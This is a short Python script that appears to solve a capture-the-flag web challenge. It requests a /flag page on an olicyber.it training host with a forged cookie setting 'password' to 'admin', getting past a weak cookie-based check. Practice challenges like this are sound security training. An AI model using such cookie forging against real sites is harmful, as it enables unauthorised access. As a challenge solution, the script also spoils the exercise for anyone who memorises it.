import requests

cookie = {'password' : 'admin'}

#cookie = dict(password='admin')

url = 'http://web-05.challs.olicyber.it/flag'

r = requests.get(url=url,cookies=cookie)

print(r.text)